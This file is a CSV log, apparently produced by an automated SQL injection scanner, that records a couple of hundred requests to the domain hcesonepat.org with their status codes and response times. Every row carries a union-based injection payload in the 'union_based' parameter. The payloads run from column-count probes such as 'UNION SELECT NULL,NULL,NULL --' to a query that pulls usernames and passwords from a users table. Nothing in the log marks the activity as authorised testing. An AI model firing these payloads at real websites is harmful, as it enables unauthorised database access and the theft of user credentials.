URL,Status Code,Response Time (s),Payload
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,1.4663043022155762,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,1.3742170333862305,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,0.33202624320983887,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.5398533344268799,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,1.7277343273162842,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,1.7657294273376465,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,1.460646152496338,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,0.5015840530395508,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,0.42974257469177246,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,0.42899417877197266,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,0.49952268600463867,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,0.5210509300231934,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,1.7415046691894531,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,1.6845800876617432,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,1.7330853939056396,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,0.5348029136657715,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,0.5334665775299072,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,1.7433552742004395,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.6678283214569092,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.809216022491455,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.7369658946990967,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,1.9055092334747314,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,0.4073009490966797,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,1.8539109230041504,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.7772908210754395,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,0.4421834945678711,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,0.5204770565032959,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,0.5204813480377197,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,1.814211130142212,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,1.7852516174316406,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,1.7910981178283691,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,0.6296701431274414,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,1.7234067916870117,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,0.695030927658081,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,1.95499587059021,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.9343674182891846,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,1.5399773120880127,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,1.5650701522827148,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,1.9292006492614746,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.6066813468933105,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,1.8883752822875977,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,1.589191198348999,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,1.5810737609863281,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,1.5870580673217773,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,1.606855869293213,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.572474479675293,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,1.5678677558898926,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,1.5766308307647705,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,0.7335655689239502,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.3996498584747314,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.3688008785247803,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,1.438518762588501,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,1.3632776737213135,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.5407121181488037,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,1.315586805343628,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.293053150177002,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.3522324562072754,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,0.7329502105712891,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,0.5702829360961914,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,0.45057249069213867,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,0.3869144916534424,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,0.18035507202148438,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,0.2050952911376953,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,0.20470881462097168,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,0.20230889320373535,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,0.2150709629058838,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,0.21384286880493164,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,0.22303295135498047,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,0.22871971130371094,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,0.2865750789642334,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,0.2848227024078369,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,0.2985105514526367,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,0.27305173873901367,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,0.3805530071258545,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,1.7971930503845215,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,0.24680256843566895,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,1.8255515098571777,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,1.80802321434021,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,0.1989905834197998,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.675335168838501,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,1.791290521621704,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,0.40410757064819336,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,0.3863058090209961,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,0.38415098190307617,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,0.37131381034851074,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,0.38188743591308594,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.5841765403747559,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,1.5852453708648682,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,1.7231264114379883,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,1.528233289718628,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,1.5285413265228271,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,1.7018799781799316,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,1.5109341144561768,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,1.529628038406372,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,1.4935953617095947,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,1.5248491764068604,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.6862823963165283,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,1.783902645111084,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,1.9023723602294922,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,1.8427608013153076,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,0.5431218147277832,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,0.5398621559143066,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,0.5442438125610352,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,0.5547420978546143,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,1.8442366123199463,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,1.5985612869262695,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,1.727614402770996,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,1.6670973300933838,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,1.7218291759490967,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,1.6709794998168945,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,0.733299970626831,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,0.7332828044891357,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,1.640131950378418,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,1.5417029857635498,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.6151893138885498,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,1.4560348987579346,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,1.6041841506958008,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,1.430889368057251,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,1.5716602802276611,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.587658166885376,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,1.4216065406799316,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,1.3044753074645996,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.4467923641204834,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,1.4423494338989258,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,1.4176430702209473,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.3704168796539307,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.322037935256958,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,0.6443774700164795,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,0.6472530364990234,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.26300048828125,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,0.5869004726409912,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,0.5674681663513184,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,0.5933272838592529,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,0.6022372245788574,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,1.3107225894927979,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.2209086418151855,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,1.2808587551116943,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.2651002407073975,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,0.49826574325561523,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,1.0934295654296875,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,0.9540340900421143,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,0.9496183395385742,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.089550495147705,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,0.30771470069885254,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,0.28679442405700684,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,0.39853882789611816,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,0.3966960906982422,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,0.3489689826965332,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,1.0717942714691162,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,0.8912620544433594,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.0445775985717773,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,0.9939849376678467,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.0830819606781006,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,1.061584711074829,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,1.0621516704559326,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,0.29996252059936523,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,0.35626220703125,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,0.3727762699127197,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,0.4092705249786377,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,1.0064125061035156,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,0.9999775886535645,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,0.31366705894470215,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,0.3219184875488281,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,0.2881302833557129,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,0.29853081703186035,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,0.9455149173736572,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,0.26791834831237793,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,0.8916928768157959,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,1.1081593036651611,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,1.2026374340057373,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,1.141423225402832,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,1.035562515258789,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,1.1313331127166748,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,0.36074280738830566,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,0.30489087104797363,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.0481889247894287,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,0.2930748462677002,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,1.0485422611236572,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,0.28249669075012207,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--,200,0.24921965599060059,"' UNION SELECT username, password FROM users --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,0.28040528297424316,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,0.2752716541290283,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,0.2943685054779053,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,0.4267711639404297,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,0.4279823303222656,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,1.457195520401001,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%20--,200,1.3836643695831299,"' UNION SELECT NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL%20--,200,1.4494950771331787,"' UNION SELECT NULL,NULL,NULL --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,1.3640048503875732,"' UNION SELECT 1,2,3 --"
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%20NULL%20--,200,0.3756599426269531,' UNION SELECT NULL --
https://hcesonepat.org?union_based=%27%20UNION%20SELECT%201%2C2%2C3%20--,200,0.3626828193664551,"' UNION SELECT 1,2,3 --"
